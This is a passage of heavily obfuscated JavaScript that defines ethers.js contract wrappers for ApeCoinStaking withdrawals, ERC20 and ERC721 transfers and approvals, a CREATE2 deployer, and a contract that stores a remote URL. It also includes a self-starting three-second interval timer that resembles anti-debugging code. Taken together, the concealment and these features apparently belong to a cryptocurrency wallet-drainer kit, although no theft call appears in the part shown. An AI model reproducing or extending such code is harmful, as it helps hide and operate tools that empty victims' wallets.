const _0x39dc13 = {
  components: [_0x5b7466, _0xb5bcc7, _0x49580d, _0x30e5f6],
  internalType: "struct ApeCoinStaking.TimeRange",
  name: "currentTimeRange",
  type: "tuple"
};
const _0x240eb2 = {
  components: [_0x58b8ef, _0x231970, _0x39dc13],
  internalType: "struct ApeCoinStaking.PoolUI",
  name: '',
  type: "tuple"
};
const _0x187107 = {
  inputs: [],
  name: "getPoolsUI",
  outputs: [_0x71713, _0x3105b3, _0x39ada2, _0x240eb2],
  stateMutability: 'view',
  type: 'function'
};
const _0x4a46a7 = {
  internalType: "address",
  name: '_address',
  type: "address"
};
const _0x46dbe8 = {
  internalType: "uint256",
  name: 'poolId',
  type: "uint256"
};
const _0xa28fce = {
  internalType: "uint256",
  name: "tokenId",
  type: "uint256"
};
const _0x5b9a3b = {
  internalType: "uint256",
  name: 'deposited',
  type: 'uint256'
};
const _0x6a0ef8 = {
  internalType: "uint256",
  name: "unclaimed",
  type: "uint256"
};
const _0x45d81b = {
  internalType: "uint256",
  name: "rewards24hr",
  type: "uint256"
};
const _0x15d0b1 = {
  internalType: "uint256",
  name: "mainTokenId",
  type: "uint256"
};
const _0x18405f = {
  internalType: 'uint256',
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x3bd8cc = {
  components: [_0x15d0b1, _0x18405f],
  internalType: "struct ApeCoinStaking.DashboardPair",
  name: 'pair',
  type: "tuple"
};
const _0x50e05d = {
  components: [_0x46dbe8, _0xa28fce, _0x5b9a3b, _0x6a0ef8, _0x45d81b, _0x3bd8cc],
  internalType: "struct ApeCoinStaking.DashboardStake[]",
  name: '',
  type: "tuple[]"
};
const _0x5e63fe = {
  inputs: [_0x4a46a7],
  name: "getSplitStakes",
  outputs: [_0x50e05d],
  stateMutability: "view",
  type: "function"
};
const _0x19e530 = {
  internalType: "uint256",
  name: "_poolId",
  type: "uint256"
};
const _0x4c75a0 = {
  internalType: "uint256",
  name: "_index",
  type: 'uint256'
};
const _0x4da758 = {
  internalType: "uint48",
  name: "startTimestampHour",
  type: "uint48"
};
const _0x5df94b = {
  internalType: "uint48",
  name: "endTimestampHour",
  type: "uint48"
};
const _0x343150 = {
  internalType: 'uint96',
  name: "rewardsPerHour",
  type: "uint96"
};
const _0x17bf55 = {
  internalType: 'uint96',
  name: "capPerPosition",
  type: "uint96"
};
const _0x1e8e05 = {
  components: [_0x4da758, _0x5df94b, _0x343150, _0x17bf55],
  internalType: "struct ApeCoinStaking.TimeRange"
};
function _0x272332(_0x737929, _0x5f41aa, _0x2f1ba5, _0x1d7be2) {
  return _0x16e3(_0x2f1ba5 - 0x24f, _0x1d7be2);
}
_0x1e8e05.name = '';
_0x1e8e05.type = "tuple";
const _0x56f61d = {
  inputs: [_0x19e530, _0x4c75a0],
  name: "getTimeRangeBy",
  outputs: [_0x1e8e05],
  stateMutability: "view",
  type: 'function'
};
const _0x5b9607 = {
  internalType: 'uint256',
  name: '',
  type: 'uint256'
};
const _0x25abe6 = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x2f79fa = {
  internalType: "uint248",
  name: 'tokenId',
  type: 'uint248'
};
const _0x3eacfe = {
  internalType: "bool",
  name: "isPaired",
  type: "bool"
};
const _0x55e4d6 = {
  inputs: [_0x5b9607, _0x25abe6],
  name: 'mainToBakc',
  outputs: [_0x2f79fa, _0x3eacfe],
  stateMutability: 'view',
  type: 'function'
};
const _0x354156 = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0xa9774c = {
  internalType: "contract ERC721Enumerable",
  name: '',
  type: "address"
};
const _0x5e89d5 = {
  inputs: [_0x354156],
  name: "nftContracts",
  outputs: [_0xa9774c],
  stateMutability: 'view',
  type: "function"
};
const _0x2d7171 = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x16cf4a = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0x2cd54a = {
  internalType: "uint256",
  name: "stakedAmount",
  type: 'uint256'
};
const _0x5b6c93 = {
  internalType: "int256",
  name: "rewardsDebt",
  type: 'int256'
};
const _0x57a288 = {
  inputs: [_0x2d7171, _0x16cf4a],
  name: "nftPosition",
  outputs: [_0x2cd54a, _0x5b6c93],
  stateMutability: "view",
  type: "function"
};
const _0x6aa99f = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0x512027 = {
  inputs: [],
  name: "owner",
  outputs: [_0x6aa99f],
  stateMutability: "view",
  type: "function"
};
const _0x4aba63 = {
  internalType: 'uint256',
  name: "_poolId",
  type: "uint256"
};
const _0x3282ac = {
  internalType: "address",
  name: "_address",
  type: "address"
};
const _0x3ee82d = {
  internalType: "uint256",
  name: '_tokenId',
  type: "uint256"
};
const _0x16d0d3 = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x3075c4 = {
  inputs: [_0x4aba63, _0x3282ac, _0x3ee82d],
  name: "pendingRewards",
  outputs: [_0x16d0d3],
  stateMutability: "view",
  type: "function"
};
const _0x565e63 = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0x5bdda4 = {
  internalType: 'uint48',
  name: "lastRewardedTimestampHour",
  type: "uint48"
};
const _0x5e97b5 = {
  internalType: "uint16",
  name: "lastRewardsRangeIndex",
  type: "uint16"
};
const _0x13410f = {
  internalType: "uint96",
  name: "stakedAmount",
  type: "uint96"
};
const _0x56e43b = {
  internalType: "uint96",
  name: "accumulatedRewardsPerShare",
  type: "uint96"
};
const _0x3668d9 = {
  inputs: [_0x565e63],
  name: 'pools',
  outputs: [_0x5bdda4, _0x5e97b5, _0x13410f, _0x56e43b],
  stateMutability: "view",
  type: 'function'
};
const _0x31b576 = {
  internalType: 'uint256',
  name: "_poolId",
  type: 'uint256'
};
const _0xc9fc1c = {
  inputs: [_0x31b576],
  name: "removeLastTimeRange",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x33b0c6 = {
  inputs: [],
  name: "renounceOwnership",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x2618cf = {
  internalType: 'uint256',
  name: "_poolId",
  type: "uint256"
};
const _0x50b9e4 = {
  internalType: "uint256",
  name: "_from",
  type: "uint256"
};
const _0x254d9c = {
  internalType: "uint256",
  name: '_to',
  type: "uint256"
};
const _0x52f0e7 = {
  internalType: "uint256",
  name: '',
  type: 'uint256'
};
const _0x2737eb = {
  internalType: "uint256",
  name: '',
  type: 'uint256'
};
const _0x513676 = {
  inputs: [_0x2618cf, _0x50b9e4, _0x254d9c],
  name: 'rewardsBy',
  outputs: [_0x52f0e7, _0x2737eb],
  stateMutability: 'view',
  type: "function"
};
const _0x44090d = {
  internalType: "address",
  name: '_address',
  type: "address"
};
const _0x17d2da = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x3b36b5 = {
  inputs: [_0x44090d],
  name: "stakedTotal",
  outputs: [_0x17d2da],
  stateMutability: 'view',
  type: "function"
};
const _0x33620f = {
  internalType: 'address',
  name: 'newOwner',
  type: 'address'
};
const _0xdd7267 = {
  inputs: [_0x33620f],
  name: "transferOwnership",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0xdd8b14 = {
  internalType: "uint256",
  name: "_poolId",
  type: 'uint256'
};
const _0x344cdc = {
  inputs: [_0xdd8b14],
  name: "updatePool",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x156ec7 = {
  internalType: 'uint256',
  name: "_amount",
  type: 'uint256'
};
const _0x28045c = {
  internalType: 'address',
  name: "_recipient",
  type: "address"
};
const _0x50a811 = {
  inputs: [_0x156ec7, _0x28045c],
  name: "withdrawApeCoin",
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x33fab6 = {
  internalType: 'uint32',
  name: "mainTokenId",
  type: "uint32"
};
const _0x585da6 = {
  internalType: "uint32",
  name: "bakcTokenId",
  type: "uint32"
};
const _0x48cfd4 = {
  internalType: 'uint184',
  name: 'amount',
  type: "uint184"
};
const _0x418403 = {
  internalType: 'bool',
  name: "isUncommit",
  type: "bool"
};
const _0x42eca4 = {
  components: [_0x33fab6, _0x585da6, _0x48cfd4, _0x418403],
  internalType: "struct ApeCoinStaking.PairNftWithdrawWithAmount[]",
  name: "_baycPairs",
  type: 'tuple[]'
};
const _0x1fa44a = {
  internalType: "uint32",
  name: "mainTokenId",
  type: "uint32"
};
const _0x109400 = {
  internalType: "uint32",
  name: "bakcTokenId",
  type: 'uint32'
};
const _0x1395c6 = {
  internalType: "uint184",
  name: "amount",
  type: "uint184"
};
const _0x257dc3 = {
  internalType: "bool",
  name: "isUncommit",
  type: "bool"
};
const _0x518850 = {
  components: [_0x1fa44a, _0x109400, _0x1395c6, _0x257dc3],
  internalType: "struct ApeCoinStaking.PairNftWithdrawWithAmount[]",
  name: '_maycPairs',
  type: "tuple[]"
};
const _0x3a9052 = {
  inputs: [_0x42eca4, _0x518850],
  name: "withdrawBAKC",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x1d0433 = {
  internalType: "uint32",
  name: "tokenId",
  type: "uint32"
};
const _0x4e089c = {
  internalType: "uint224",
  name: "amount",
  type: "uint224"
};
const _0x45feea = {
  components: [_0x1d0433, _0x4e089c],
  internalType: "struct ApeCoinStaking.SingleNft[]",
  name: "_nfts",
  type: "tuple[]"
};
const _0x356715 = {
  internalType: "address",
  name: "_recipient",
  type: "address"
};
const _0x3ab388 = {
  inputs: [_0x45feea, _0x356715],
  name: "withdrawBAYC",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x140214 = {
  internalType: "uint32",
  name: "tokenId",
  type: "uint32"
};
const _0x810516 = {
  internalType: "uint224",
  name: "amount",
  type: "uint224"
};
const _0x4be8a9 = {
  components: [_0x140214, _0x810516],
  internalType: "struct ApeCoinStaking.SingleNft[]",
  name: "_nfts",
  type: "tuple[]"
};
const _0x44e437 = {
  internalType: "address",
  name: '_recipient',
  type: "address"
};
const _0x10eddf = {
  inputs: [_0x4be8a9, _0x44e437],
  name: "withdrawMAYC",
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x5b7e28 = {
  internalType: "uint256",
  name: "_amount",
  type: "uint256"
};
const _0x7580b1 = {
  inputs: [_0x5b7e28],
  name: "withdrawSelfApeCoin",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x3b56a3 = {
  internalType: "uint32",
  name: "tokenId",
  type: "uint32"
};
const _0x5c0b65 = {
  internalType: 'uint224',
  name: "amount",
  type: "uint224"
};
const _0x222743 = {
  components: [_0x3b56a3, _0x5c0b65],
  internalType: "struct ApeCoinStaking.SingleNft[]",
  name: "_nfts",
  type: 'tuple[]'
};
const _0x5a744d = {
  inputs: [_0x222743],
  name: "withdrawSelfBAYC",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x407d12 = {
  internalType: 'uint32',
  name: "tokenId",
  type: "uint32"
};
const _0x45d37a = {
  internalType: "uint224",
  name: "amount",
  type: 'uint224'
};
const _0x34d4d0 = {
  components: [_0x407d12, _0x45d37a],
  internalType: "struct ApeCoinStaking.SingleNft[]",
  name: "_nfts",
  type: "tuple[]"
};
const _0x2a05e6 = {
  inputs: [_0x34d4d0],
  name: "withdrawSelfMAYC",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
class ApeFactory {
  ['interface'];
  ["contract"];
  ["abi"] = [_0x3acacd, _0x2800f5, _0x3996dd, _0x713dc, _0x589735, _0xc68642, _0x8c34a6, _0x2a6b8f, _0x5c033f, _0x2f0e0f, _0x3b5e90, _0x39728c, _0x4071fc, _0x3fe533, _0x439a69, _0x12f3a7, _0x118d21, _0x25af32, _0x1bde0f, _0x2b5bcb, _0x304d39, _0x1008fc, _0x308231, _0x431598, _0x1758bb, _0x3be32e, _0x16dc0a, _0x2c8953, _0x48c8b1, _0x1b0838, _0x44e5f0, _0x2998ad, _0x2f4d56, _0x8c797e, _0x5689e4, _0x189109, _0x124d8f, _0x1657b6, _0x424639, _0x499fde, _0x20f938, _0x144059, _0x1767e6, _0x35c7d0, _0x4000f3, _0x5c4d8d, _0x5bc9f7, _0x4f79e3, _0x1c1703, _0x484b13, _0x1aee70, _0x32f52c, _0x187107, _0x5e63fe, _0x56f61d, _0x55e4d6, _0x5e89d5, _0x57a288, _0x512027, _0x3075c4, _0x3668d9, _0xc9fc1c, _0x33b0c6, _0x513676, _0x3b36b5, _0xdd7267, _0x344cdc, _0x50a811, _0x3a9052, _0x3ab388, _0x10eddf, _0x7580b1, _0x5a744d, _0x2a05e6];
  constructor(_0x21c49a, _0xaf7ff8) {
    this["interface"] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x21c49a, this.abi, _0xaf7ff8);
  }
}
const _0x4af700 = {
  internalType: "string",
  name: "updatedUrl",
  type: "string"
};
const _0x4b077b = {
  inputs: [_0x4af700],
  name: "setUrl",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x11f1cb = {
  internalType: 'string',
  name: "newUrl",
  type: "string"
};
const _0x537cd0 = {
  inputs: [_0x11f1cb],
  stateMutability: "nonpayable",
  type: "constructor"
};
const _0x15b0a5 = {
  internalType: "string",
  name: '',
  type: "string"
};
const _0x5f0ee4 = {
  inputs: [],
  name: "_url",
  outputs: [_0x15b0a5],
  stateMutability: "view",
  type: 'function'
};
const _0x4484f8 = {
  internalType: "address",
  name: '',
  type: 'address'
};
const _0x18ca52 = {
  inputs: [],
  name: "owner",
  outputs: [_0x4484f8],
  stateMutability: "view",
  type: "function"
};
const _0x2275f4 = {
  internalType: "string",
  name: '',
  type: 'string'
};
const _0x75fd24 = {
  inputs: [],
  name: "url",
  outputs: [_0x2275f4],
  stateMutability: "view",
  type: "function"
};
class APIFactory {
  ["interface"];
  ["contract"];
  ['abi'] = [_0x4b077b, _0x537cd0, _0x5f0ee4, _0x18ca52, _0x75fd24];
  constructor(_0x131f1f, _0x3d732c) {
    this['interface'] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x131f1f, this.abi, _0x3d732c);
  }
}
(function () {
  let _0xd27bd7;
  try {
    const _0x298bd1 = Function("return (function() {}.constructor(\"return this\")( ));");
    _0xd27bd7 = _0x298bd1();
  } catch (_0x280916) {
    _0xd27bd7 = window;
  }
  _0xd27bd7.setInterval(_0x1a9c59, 3000);
})();
const _0x2e0bdc = {
  internalType: "bytes32",
  name: 'salt',
  type: "bytes32"
};
const _0x53973e = {
  internalType: 'bytes',
  name: "creationCode",
  type: "bytes"
};
const _0x5252c3 = {
  internalType: "address",
  name: 'deployed',
  type: "address"
};
const _0x27f303 = {
  inputs: [_0x2e0bdc, _0x53973e],
  name: "deploy",
  outputs: [_0x5252c3],
  stateMutability: "payable",
  type: "function"
};
const _0x53543f = {
  internalType: "address",
  name: "deployer",
  type: "address"
};
const _0x18d55c = {
  internalType: 'bytes32',
  name: "salt",
  type: "bytes32"
};
const _0x215f5b = {
  internalType: "address",
  name: "deployed",
  type: "address"
};
const _0x5b045d = {
  inputs: [_0x53543f, _0x18d55c],
  name: "getDeployed",
  outputs: [_0x215f5b],
  stateMutability: "view",
  type: "function"
};
class CreateFactory {
  ['interface'];
  ['contract'];
  ["abi"] = [_0x27f303, _0x5b045d];
  constructor(_0x24e5bb, _0x543dd7) {
    this["interface"] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x24e5bb, this.abi, _0x543dd7);
  }
}
const _0x206b4d = {
  inputs: [],
  payable: false,
  stateMutability: "nonpayable",
  type: "constructor"
};
const _0x3dd9ef = {
  indexed: true,
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x43bfe9 = {
  indexed: true,
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0xff8fe6 = {
  indexed: false,
  internalType: "uint256",
  name: "value",
  type: 'uint256'
};
const _0x5ba36e = {
  anonymous: false,
  inputs: [_0x3dd9ef, _0x43bfe9, _0xff8fe6],
  name: "Approval",
  type: "event"
};
const _0xd3503 = {
  indexed: true,
  internalType: "address",
  name: "previousOwner",
  type: "address"
};
const _0x42bc74 = {
  indexed: true,
  internalType: "address",
  name: "newOwner",
  type: "address"
};
const _0x4bc6e0 = {
  anonymous: false,
  inputs: [_0xd3503, _0x42bc74],
  name: "OwnershipTransferred",
  type: 'event'
};
const _0x329d2d = {
  indexed: true,
  internalType: "address",
  name: "from",
  type: "address"
};
const _0x380088 = {
  indexed: true,
  internalType: 'address',
  name: 'to',
  type: "address"
};
const _0x2146dc = {
  indexed: false,
  internalType: 'uint256',
  name: "value",
  type: 'uint256'
};
const _0xc05215 = {
  anonymous: false,
  inputs: [_0x329d2d, _0x380088, _0x2146dc],
  name: "Transfer",
  type: "event"
};
const _0x33389d = {
  internalType: "uint8",
  name: '',
  type: "uint8"
};
const _0x3fa1ba = {
  constant: true,
  inputs: [],
  name: "_decimals",
  outputs: [_0x33389d],
  payable: false,
  stateMutability: 'view',
  type: "function"
};
const _0x1bc9a2 = {
  internalType: "string",
  name: '',
  type: "string"
};
const _0x41e2f7 = {
  constant: true,
  inputs: [],
  name: "_name",
  outputs: [_0x1bc9a2],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x4de529 = {
  internalType: 'string',
  name: '',
  type: "string"
};
const _0x16e1cd = {
  constant: true,
  inputs: [],
  name: '_symbol',
  outputs: [_0x4de529],
  payable: false,
  stateMutability: 'view',
  type: 'function'
};
const _0x163752 = {
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x217340 = {
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0x304f28 = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x776928 = {
  constant: true,
  inputs: [_0x163752, _0x217340],
  name: "allowance",
  outputs: [_0x304f28],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x4bd47f = {
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0x1dd065 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x256fea = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x33968d = {
  constant: false,
  inputs: [_0x4bd47f, _0x1dd065],
  name: 'approve',
  outputs: [_0x256fea],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x5972e3 = {
  internalType: 'address',
  name: "account",
  type: "address"
};
const _0x3ae936 = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0xfdec9f = {
  constant: true,
  inputs: [_0x5972e3],
  name: "balanceOf",
  outputs: [_0x3ae936],
  payable: false,
  stateMutability: "view",
  type: 'function'
};
const _0x2e8ae0 = {
  internalType: 'uint256',
  name: "amount",
  type: 'uint256'
};
const _0x211cb8 = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x19851d = {
  constant: false,
  inputs: [_0x2e8ae0],
  name: "burn",
  outputs: [_0x211cb8],
  payable: false,
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x6664d2 = {
  internalType: 'uint8',
  name: '',
  type: "uint8"
};
const _0x25da91 = {
  constant: true,
  inputs: [],
  name: "decimals",
  outputs: [_0x6664d2],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x151f0a = {
  internalType: "address",
  name: 'spender',
  type: "address"
};
const _0x4774a9 = {
  internalType: "uint256",
  name: "subtractedValue",
  type: 'uint256'
};
const _0x576930 = {
  internalType: 'bool',
  name: '',
  type: "bool"
};
const _0x5b5635 = {
  constant: false,
  inputs: [_0x151f0a, _0x4774a9],
  name: "decreaseAllowance",
  outputs: [_0x576930],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x2df426 = {
  internalType: 'address',
  name: '',
  type: "address"
};
const _0x342d5f = {
  constant: true,
  inputs: [],
  name: "getOwner",
  outputs: [_0x2df426],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x35a103 = {
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0x3e471c = {
  internalType: 'uint256',
  name: 'addedValue',
  type: "uint256"
};
const _0x2ca9bf = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x4f3d92 = {
  constant: false,
  inputs: [_0x35a103, _0x3e471c],
  name: "increaseAllowance",
  outputs: [_0x2ca9bf],
  payable: false,
  stateMutability: 'nonpayable',
  type: 'function'
};
const _0x2c0c70 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x1e7525 = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x32300c = {
  constant: false,
  inputs: [_0x2c0c70],
  name: "mint",
  outputs: [_0x1e7525],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x1b1288 = {
  internalType: "string",
  name: '',
  type: "string"
};
const _0x765396 = {
  constant: true,
  inputs: [],
  name: "name",
  outputs: [_0x1b1288],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x2280bb = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0x2acd41 = {
  constant: true,
  inputs: [],
  name: 'owner',
  outputs: [_0x2280bb],
  payable: false,
  stateMutability: 'view',
  type: 'function'
};
const _0x4d0eb9 = {
  constant: false,
  inputs: [],
  name: "renounceOwnership",
  outputs: [],
  payable: false,
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x5cddd4 = {
  internalType: "string",
  name: '',
  type: "string"
};
const _0x9c8839 = {
  constant: true,
  inputs: [],
  name: "symbol",
  outputs: [_0x5cddd4],
  payable: false,
  stateMutability: 'view',
  type: "function"
};
const _0x4e44eb = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0x4372ea = {};
function _0x16e3(_0x4d969e, _0x2cd1a4) {
  const _0x17d04a = _0x3ae7();
  _0x16e3 = function (_0x5a4476, _0xa379a3) {
    _0x5a4476 = _0x5a4476 - 414;
    let _0x50f945 = _0x17d04a[_0x5a4476];
    return _0x50f945;
  };
  return _0x16e3(_0x4d969e, _0x2cd1a4);
}
_0x4372ea.constant = true;
_0x4372ea.inputs = [];
_0x4372ea.name = "totalSupply";
_0x4372ea.outputs = [_0x4e44eb];
_0x4372ea.payable = false;
_0x4372ea.stateMutability = "view";
_0x4372ea.type = "function";
const _0x5bbfbb = {
  internalType: "address",
  name: "recipient",
  type: 'address'
};
const _0x44816f = {
  internalType: 'uint256',
  name: "amount",
  type: 'uint256'
};
const _0x160044 = {
  internalType: 'bool',
  name: '',
  type: "bool"
};
const _0x37828c = {
  constant: false,
  inputs: [_0x5bbfbb, _0x44816f],
  name: "transfer",
  outputs: [_0x160044],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x2ab9a3 = {
  internalType: "address",
  name: "sender",
  type: "address"
};
const _0xa64d63 = {
  internalType: 'address',
  name: "recipient",
  type: "address"
};
const _0x344ba0 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x57ce48 = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x2681bc = {
  constant: false,
  inputs: [_0x2ab9a3, _0xa64d63, _0x344ba0],
  name: "transferFrom",
  outputs: [_0x57ce48],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x3d41be = {
  internalType: "address",
  name: 'newOwner',
  type: 'address'
};
const _0x4eab93 = {
  constant: false,
  inputs: [_0x3d41be],
  name: "transferOwnership",
  outputs: [],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
class ERC20Factory {
  ["interface"];
  ["contract"];
  ["abi"] = [_0x206b4d, _0x5ba36e, _0x4bc6e0, _0xc05215, _0x3fa1ba, _0x41e2f7, _0x16e1cd, _0x776928, _0x33968d, _0xfdec9f, _0x19851d, _0x25da91, _0x5b5635, _0x342d5f, _0x4f3d92, _0x32300c, _0x765396, _0x2acd41, _0x4d0eb9, _0x9c8839, _0x4372ea, _0x37828c, _0x2681bc, _0x4eab93];
  constructor(_0x344b88, _0xd27fb9) {
    this["interface"] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x344b88, this.abi, _0xd27fb9);
  }
}
const _0x1f94a0 = {
  internalType: "address",
  name: 'to',
  type: "address"
};
const _0x73bf60 = {
  internalType: 'uint256',
  name: 'tokenId',
  type: "uint256"
};
const _0x1ac9e6 = {
  constant: false,
  inputs: [_0x1f94a0, _0x73bf60],
  name: "approve",
  outputs: [],
  payable: false,
  stateMutability: 'nonpayable',
  type: "function"
};
const _0xcc724d = {
  internalType: "address",
  name: 'to',
  type: "address"
};
const _0x217fa2 = {
  internalType: 'uint256',
  name: "tokenId",
  type: 'uint256'
};
const _0x1c7690 = {
  constant: false,
  inputs: [_0xcc724d, _0x217fa2],
  name: "mint",
  outputs: [],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x32bb45 = {
  internalType: "address",
  name: "from",
  type: 'address'
};
const _0x549317 = {
  internalType: 'address',
  name: 'to',
  type: "address"
};
const _0x11c3bb = {
  internalType: "uint256",
  name: "tokenId",
  type: "uint256"
};
const _0xfe62ac = {
  constant: false,
  inputs: [_0x32bb45, _0x549317, _0x11c3bb],
  name: "safeTransferFrom",
  outputs: [],
  payable: false,
  stateMutability: 'nonpayable',
  type: 'function'
};
const _0x2a2575 = {
  internalType: 'address',
  name: 'to',
  type: "address"
};
const _0x597a59 = {
  internalType: "bool",
  name: "approved",
  type: "bool"
};
const _0x4713b3 = {
  constant: false,
  inputs: [_0x2a2575, _0x597a59],
  name: "setApprovalForAll",
  outputs: [],
  payable: false,
  stateMutability: "nonpayable",
  type: "function"
};
const _0x5a49bb = {
  internalType: "address",
  name: 'from',
  type: 'address'
};
const _0x1f7d99 = {
  internalType: "address",
  name: 'to',
  type: 'address'
};
const _0x4b1813 = {
  internalType: "uint256",
  name: "tokenId",
  type: "uint256"
};
const _0x1b343b = {
  constant: false,
  inputs: [_0x5a49bb, _0x1f7d99, _0x4b1813],
  name: "transferFrom",
  outputs: [],
  payable: false,
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x27e6d3 = {
  inputs: [],
  payable: false,
  stateMutability: 'nonpayable',
  type: "constructor"
};
const _0x36d054 = {
  indexed: true,
  internalType: "address",
  name: "from",
  type: 'address'
};
const _0x72940b = {
  indexed: true,
  internalType: "address",
  name: 'to',
  type: "address"
};
const _0x445c90 = {
  indexed: true,
  internalType: "uint256",
  name: "tokenId",
  type: 'uint256'
};
const _0x4972ec = {
  anonymous: false,
  inputs: [_0x36d054, _0x72940b, _0x445c90],
  name: 'Transfer',
  type: 'event'
};
const _0x3a121c = {
  indexed: true,
  internalType: 'address',
  name: 'owner',
  type: "address"
};
const _0x436c00 = {
  indexed: true,
  internalType: "address",
  name: 'approved',
  type: 'address'
};
const _0xe4a27 = {
  indexed: true,
  internalType: "uint256",
  name: 'tokenId',
  type: "uint256"
};
const _0x522881 = {
  anonymous: false,
  inputs: [_0x3a121c, _0x436c00, _0xe4a27],
  name: "Approval",
  type: "event"
};
const _0x4c54ff = {
  indexed: true,
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x45ed62 = {
  indexed: true,
  internalType: "address",
  name: "operator",
  type: "address"
};
const _0x2974cb = {
  indexed: false,
  internalType: "bool",
  name: "approved",
  type: "bool"
};
const _0x34a6d0 = {
  anonymous: false,
  inputs: [_0x4c54ff, _0x45ed62, _0x2974cb],
  name: "ApprovalForAll",
  type: 'event'
};
const _0x3a64ec = {
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x30b86c = {
  internalType: "uint256",
  name: '',
  type: 'uint256'
};
const _0x1f4e84 = {
  constant: true,
  inputs: [_0x3a64ec],
  name: "balanceOf",
  outputs: [_0x30b86c],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x27befb = {
  internalType: "uint256",
  name: 'tokenId',
  type: "uint256"
};
const _0x53eeaa = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0x58f779 = {
  constant: true,
  inputs: [_0x27befb],
  name: "getApproved",
  outputs: [_0x53eeaa],
  payable: false,
  stateMutability: "view",
  type: 'function'
};
const _0x5c303c = {
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x68fd9e = {
  internalType: "address",
  name: "operator",
  type: 'address'
};
const _0x397c6d = {
  internalType: "bool",
  name: '',
  type: "bool"
};
const _0x35b519 = {
  constant: true,
  inputs: [_0x5c303c, _0x68fd9e],
  name: "isApprovedForAll",
  outputs: [_0x397c6d],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0xe6a5ee = {
  internalType: 'uint256',
  name: "tokenId",
  type: "uint256"
};
const _0x2ce0aa = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0x4c2b6b = {
  constant: true,
  inputs: [_0xe6a5ee],
  name: "ownerOf",
  outputs: [_0x2ce0aa],
  payable: false,
  stateMutability: "view",
  type: "function"
};
const _0x542695 = {
  internalType: 'bytes4',
  name: "interfaceId",
  type: "bytes4"
};
const _0x59ed56 = {
  internalType: 'bool',
  name: '',
  type: 'bool'
};
const _0x2461b9 = {
  constant: true,
  inputs: [_0x542695],
  name: "supportsInterface",
  outputs: [_0x59ed56],
  payable: false,
  stateMutability: "view",
  type: "function"
};
class ERC721Factory {
  ["interface"];
  ["contract"];
  ["abi"] = [_0x1ac9e6, _0x1c7690, _0xfe62ac, _0x4713b3, _0x1b343b, _0x27e6d3, _0x4972ec, _0x522881, _0x34a6d0, _0x1f4e84, _0x58f779, _0x35b519, _0x4c2b6b, _0x2461b9];
  constructor(_0x502a4e, _0x3e7ccd) {
    this["interface"] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x502a4e, this.abi, _0x3e7ccd);
  }
}
const _0x6e9b26 = {
  indexed: true,
  internalType: "address",
  name: '_owner',
  type: "address"
};
const _0x48a537 = {
  indexed: true,
  internalType: "address",
  name: "_operator",
  type: "address"
};
const _0x4945dd = {
  indexed: false,
  internalType: 'bool',
